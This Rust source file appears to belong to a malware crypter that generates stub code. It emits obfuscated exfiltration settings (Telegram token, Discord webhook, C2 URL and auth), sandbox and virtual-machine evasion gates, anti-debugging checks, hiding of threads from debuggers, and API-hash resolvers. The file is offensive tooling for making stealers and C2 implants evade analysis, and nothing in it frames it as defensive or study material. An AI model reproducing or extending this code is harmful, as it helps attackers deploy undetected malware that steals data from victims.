use crypter_ir::{DebugCheck, ExecutionMethod, Gate, IntegrityCheck, Resolver, StubProgram};
use rand::Rng;

pub fn emit_exfil_config_setup(prog: &StubProgram) -> String {
    let payload = serde_json::json!({
        "telegram_token": prog.telegram_token,
        "telegram_chat": prog.telegram_chat,
        "discord_webhook": prog.discord_webhook,
        "c2_url": prog.c2_url,
        "c2_auth": prog.c2_auth,
    });
    let json = serde_json::to_vec(&payload).unwrap_or_default();

    let mut key = [0u8; 32];
    for i in 0..32 {
        key[i] = prog.seed[i] ^ prog.config_xor_key[i] ^ 0x5A;
    }

    let xored: Vec<u8> = json
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect();

    let b64 = base64_encode(&xored);

    let mut s = String::new();
    s.push_str("static EXFIL_KEY: [u8; 32] = [");
    for (i, b) in key.iter().enumerate() {
        if i > 0 {
            s.push(',');
        }
        s.push_str(&format!("{:#04x}", b));
    }
    s.push_str("];\n\n");

    s.push_str("static EXFIL_B64: &str = \"");
    s.push_str(&b64);
    s.push_str("\";\n\n");

    s.push_str(r#"fn svc_install_exfil_cfg() {
    use std::env;
    let raw = match base64_decode(EXFIL_B64) {
        Some(v) => v,
        None => return,
    };
    let dec: Vec<u8> = raw.iter().enumerate()
        .map(|(i, b)| b ^ EXFIL_KEY[i % EXFIL_KEY.len()])
        .collect();
    let s = match std::str::from_utf8(&dec) {
        Ok(s) => s,
        Err(_) => return,
    };
    env::set_var("SVC_EXFIL_CFG", s);
}

fn base64_decode(s: &str) -> Option<Vec<u8>> {
    fn val(c: u8) -> Option<u8> {
        match c {
            b'A'..=b'Z' => Some(c - b'A'),
            b'a'..=b'z' => Some(c - b'a' + 26),
            b'0'..=b'9' => Some(c - b'0' + 52),
            b'+' => Some(62),
            b'/' => Some(63),
            _ => None,
        }
    }
    let bytes: Vec<u8> = s.bytes().filter(|b| *b != b'=' && *b != b'\n' && *b != b'\r').collect();
    let mut out = Vec::with_capacity(bytes.len() * 3 / 4);
    let mut buf: u32 = 0;
    let mut bits: u32 = 0;
    for b in bytes {
        let v = match val(b) { Some(v) => v, None => return None };
        buf = (buf << 6) | v as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push(((buf >> bits) & 0xff) as u8);
        }
    }
    Some(out)
}

"#);
    s
}

pub fn emit_directive_setup(directive_const: &str) -> String {
    format!(
        r#"fn svc_set_directive() {{
    std::env::set_var("SVC_DIRECTIVE", {});
}}

"#,
        directive_const
    )
}

pub fn emit_gate<R: Rng>(rng: &mut R, name: &str, gate: &Gate, xor_key: &[u8; 32]) -> String {
    let mut s = format!("fn {}() -> bool {{\n", name);
    match gate {
        Gate::UptimeMin(secs) => {
            s.push_str("    #[cfg(target_os = \"linux\")]\n");
            s.push_str(&format!("    {{ return std::fs::read_to_string(\"/proc/uptime\").ok().and_then(|s| s.split_whitespace().next().map(|x| x.parse::<f64>().ok())).flatten().map(|u| u >= {}f64).unwrap_or(true); }}\n", secs));
            s.push_str("    #[cfg(not(target_os = \"linux\"))]\n");
            s.push_str("    { true }\n");
        }
        Gate::CursorMotion { .. } => {
            s.push_str("    return true;\n");
        }
        Gate::RamMinMb(mb) => {
            s.push_str(&format!(
                "    #[cfg(target_os = \"linux\")]\n    {{ \
                    let m = std::fs::read_to_string(\"/proc/meminfo\").unwrap_or_default(); \
                    let kb: u64 = m.lines().find(|l| l.starts_with(\"MemTotal:\")) \
                        .and_then(|l| l.split_whitespace().nth(1)).and_then(|v| v.parse().ok()).unwrap_or(0); \
                    return kb / 1024 >= {}; }}\n",
                mb
            ));
            s.push_str("    true\n");
        }
        Gate::CpuCoresMin(n) => {
            s.push_str(&format!("    return std::thread::available_parallelism().map(|p| p.get() as u8 >= {}).unwrap_or(true);\n", n));
        }
        Gate::UsernameBlocklist => {
            s.push_str("    let u = std::env::var(\"USERNAME\").or_else(|_| std::env::var(\"USER\")).unwrap_or_default().to_lowercase();\n");
            s.push_str("    return !USER_BLOCKLIST().iter().any(|b| u.contains(b.as_str()));\n");
        }
        Gate::HostnameBlocklist => {
            s.push_str("    let h = std::env::var(\"COMPUTERNAME\").or_else(|_| std::env::var(\"HOSTNAME\")).unwrap_or_default().to_lowercase();\n");
            s.push_str("    return !HOST_BLOCKLIST().iter().any(|b| h.contains(b.as_str()));\n");
        }
        Gate::DomainJoined => {
            s.push_str("    let d = std::env::var(\"USERDOMAIN\").unwrap_or_default();\n");
            s.push_str("    return !d.is_empty() && d.to_lowercase() != \"workgroup\";\n");
        }
        Gate::SleepJitter { .. } => {
            s.push_str("    return true;\n");
        }
        Gate::SleepAccelerationCheck {
            sleep_ms,
            min_ratio,
        } => {
            s.push_str(&format!("    let t0 = std::time::Instant::now();\n"));
            s.push_str(&format!(
                "    std::thread::sleep(std::time::Duration::from_millis({}));\n",
                sleep_ms
            ));
            s.push_str("    let elapsed = t0.elapsed().as_millis() as f64;\n");
            s.push_str(&format!(
                "    return elapsed >= {:.2} * {}f64;\n",
                min_ratio, sleep_ms
            ));
        }
        Gate::ApiHammerCheck => {
            s.push_str("    #[cfg(target_os = \"windows\")]\n");
            s.push_str("    { unsafe {\n");
            s.push_str("        let h = get_kernel32();\n");
            s.push_str("        if h.is_null() { return false; }\n");
            s.push_str("        let p = get_proc(h, H_CREATEFILEW);\n");
            s.push_str("        if p.is_null() { return false; }\n");
            s.push_str("        let first = *(p as *const u8);\n");
            s.push_str("        if first == 0xE9 || first == 0xEB { return false; }\n");
            s.push_str("        if first == 0xFF && *(p.add(1) as *const u8) == 0x25 { return false; }\n");
            s.push_str("        return true;\n");
            s.push_str("    }}\n");
            s.push_str("    #[cfg(not(target_os = \"windows\"))]\n");
            s.push_str("    { true }\n");
        }
        Gate::VirtualizationArtifacts => {
            s.push_str("    #[cfg(target_os = \"windows\")]\n");
            s.push_str("    { return !win_vm_artifacts(); }\n");
            s.push_str("    #[cfg(target_os = \"linux\")]\n");
            s.push_str("    { return !linux_vm_artifacts(); }\n");
            s.push_str("    #[cfg(target_os = \"macos\")]\n");
            s.push_str("    { return true; }\n");
        }
        Gate::HypervisorCpuid => {
            s.push_str("    return !cpuid_hypervisor();\n");
        }
        Gate::ParentDebugger => {
            s.push_str("    #[cfg(target_os = \"windows\")]\n");
            s.push_str("    { return !parent_is_debugger(); }\n");
            s.push_str("    #[cfg(not(target_os = \"windows\"))]\n");
            s.push_str("    { true }\n");
        }
        Gate::SnapshotCheck => {
            s.push_str("    #[cfg(target_os = \"windows\")]\n");
            s.push_str("    { return !snapshot_tools_loaded(); }\n");
            s.push_str("    #[cfg(not(target_os = \"windows\"))]\n");
            s.push_str("    { true }\n");
        }
    }
    s.push_str("}\n\n");
    let _ = (rng, xor_key);
    s
}

pub fn emit_debug_check(name: &str, check: &DebugCheck) -> String {
    let mut s = format!("fn {}() -> bool {{\n", name);
    match check {
        DebugCheck::IsDebuggerPresent => {
            s.push_str("    #[cfg(target_os = \"linux\")]\n");
            s.push_str("    { if let Ok(st) = std::fs::read_to_string(\"/proc/self/status\") { return st.lines().any(|l| l.starts_with(\"TracerPid:\") && !l.ends_with(\"0\")); } }\n");
            s.push_str("    #[cfg(target_os = \"windows\")]\n");
            s.push_str("    { unsafe { let p = peb_ptr(); if !p.is_null() { return *((p as *const u8).add(2)) != 0; } } }\n");
            s.push_str("    false\n");
        }
        DebugCheck::PEBBeingDebugged => {
            s.push_str("    #[cfg(target_os = \"windows\")]\n");
            s.push_str("    { unsafe { let p = peb_ptr(); if !p.is_null() { return *((p as *const u8).add(2)) != 0; } } }\n");
            s.push_str("    false\n");
        }
        DebugCheck::NtGlobalFlag => {
            s.push_str("    #[cfg(target_os = \"windows\")]\n");
            s.push_str("    { unsafe { let peb = peb_ptr(); if !peb.is_null() { let f = *((peb as *const u8).add(0xbc) as *const u32); return (f & 0x70) != 0; } } }\n");
            s.push_str("    false\n");
        }
        DebugCheck::NtQueryInformationProcess => {
            s.push_str("    #[cfg(target_os = \"windows\")]\n");
            s.push_str("    {\n");
            s.push_str("        unsafe {\n");
            s.push_str("            let ntdll = get_ntdll();\n");
            s.push_str("            if ntdll.is_null() { return false; }\n");
            s.push_str("            let p = get_proc(ntdll, H_NTQUERYINFO);\n");
            s.push_str("            if p.is_null() { return false; }\n");
            s.push_str("            let f: unsafe extern \"system\" fn(*mut c_void, u32, *mut u32, u32, *mut u32) -> i32 = mem::transmute(p);\n");
            s.push_str("            let handle = current_process();\n");
            s.push_str("            let mut v: u32 = 0; let mut ret: u32 = 0;\n");
            s.push_str("            if f(handle, 7, &mut v, 4, &mut ret) == 0 && v != 0 { return true; }\n");
            s.push_str("            v = 0;\n");
            s.push_str("            if f(handle, 0x1E, &mut v, 4, &mut ret) == 0 && v != 0 { return true; }\n");
            s.push_str("            v = 0;\n");
            s.push_str("            if f(handle, 0x1F, &mut v, 4, &mut ret) == 0 && v == 0 { return true; }\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    false\n");
        }
        DebugCheck::TimingCheck { rounds } => {
            s.push_str(&format!(
                "    let mut total = 0u128;\n    for _ in 0..{} {{\n",
                rounds
            ));
            s.push_str("        let t0 = std::time::Instant::now();\n");
            s.push_str("        std::thread::sleep(std::time::Duration::from_micros(1));\n");
            s.push_str("        total += t0.elapsed().as_micros();\n");
            s.push_str("    }\n");
            s.push_str(&format!("    return total / {} > 5;\n", rounds));
        }
        DebugCheck::None => {
            s.push_str("    false\n");
        }
    }
    s.push_str("}\n\n");
    s
}

pub fn emit_anti_emulation(name: &str, sleep_ms: u64, min_ratio: f32) -> String {
    format!(
        r#"fn {name}() -> bool {{
    #[cfg(target_os = "windows")]
    {{
        let t0 = std::time::Instant::now();
        unsafe { nt_sleep_ms({sleep_ms}); }
        let elapsed = t0.elapsed().as_millis() as f64;
        return elapsed >= {min_ratio:.2} * {sleep_ms}f64;
    }}
    #[cfg(not(target_os = "windows"))]
    {{
        let t0 = std::time::Instant::now();
        std::thread::sleep(std::time::Duration::from_millis({sleep_ms}));
        let elapsed = t0.elapsed().as_millis() as f64;
        elapsed >= {min_ratio:.2} * {sleep_ms}f64
    }}
}}

"#,
        name = name,
        sleep_ms = sleep_ms,
        min_ratio = min_ratio
    )
}

pub fn emit_hide_thread_fn(name: &str) -> String {
    format!(
        r#"fn {name}() {{
    #[cfg(target_os = "windows")]
    unsafe {{
        let ntdll = get_ntdll();
        if ntdll.is_null() {{ return; }}
        let p = get_proc(ntdll, H_NTSETINFO);
        if p.is_null() {{ return; }}
        let f: unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32) -> i32 = mem::transmute(p);
        let handle = current_process();
        // ThreadHideFromDebugger = 0x11, current thread = ((HANDLE)-2)
        let cur_thread = (-2isize) as *mut c_void;
        let _ = f(cur_thread, 0x11, ptr::null_mut(), 0);
        let _ = handle;
    }}
}}

"#,
        name = name
    )
}

pub fn emit_resolver_fn(name: &str, resolver: &Resolver) -> String {
    let mut s = format!(
        "unsafe fn {}(module: *const u8, hash: u32) -> *const c_void {{\n",
        name
    );
    s.push_str("    let _ = (module, hash);\n    ptr::null()\n}\n\n");
    let hash_fn = match resolver {
        Resolver::ExportWalkFnv1a | Resolver::PebWalk => {
            "fn hash_fnv1a(s: &[u8]) -> u32 { let mut h = 0x811c9dc5u32; for &b in s { h ^= b as u32; h = h.wrapping_mul(0x01000193); } h }\n"
        }
        Resolver::ExportWalkCrc32 => {
            "fn hash_crc32(s: &[u8]) -> u32 { let mut c = 0xffffffffu32; for &b in s { c ^= b as u32; for _ in 0..8 { c = if c & 1 != 0 { (c >> 1) ^ 0xedb88320 } else { c >> 1 }; } } !c }\n"
        }
        Resolver::ExportWalkDjb2 => {
            "fn hash_djb2(s: &[u8]) -> u32 { let mut h = 5381u32; for &b in s { h = h.wrapping_mul(33).wrapping_add(b as u32); } h }\n"
        }
    };
    s.push_str(hash_fn);
    s.push('\n');
    s
}

pub fn emit_exec_fn(name: &str, method: &ExecutionMethod) -> String {
    let _ = (name, method);
    String::new()
}

pub fn emit_integrity(name: &str, check: &IntegrityCheck) -> String {
    let _ = (name, check);
    String::new()
}

fn base64_encode(data: &[u8]) -> String {
    const ALPHA: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    let mut i = 0;
    while i + 3 <= data.len() {
        let n = ((data[i] as u32) << 16) | ((data[i + 1] as u32) << 8) | (data[i + 2] as u32);
        out.push(ALPHA[((n >> 18) & 63) as usize] as char);
        out.push(ALPHA[((n >> 12) & 63) as usize] as char);
        out.push(ALPHA[((n >> 6) & 63) as usize] as char);
        out.push(ALPHA[(n & 63) as usize] as char);
        i += 3;
    }
    let rem = data.len() - i;
    if rem == 1 {
        let n = (data[i] as u32) << 16;
        out.push(ALPHA[((n >> 18) & 63) as usize] as char);
        out.push(ALPHA[((n >> 12) & 63) as usize] as char);
        out.push('=');
        out.push('=');
    } else if rem == 2 {
        let n = ((data[i] as u32) << 16) | ((data[i + 1] as u32) << 8);
        out.push(ALPHA[((n >> 18) & 63) as usize] as char);
        out.push(ALPHA[((n >> 12) & 63) as usize] as char);
        out.push(ALPHA[((n >> 6) & 63) as usize] as char);
        out.push('=');
    }
    out
}
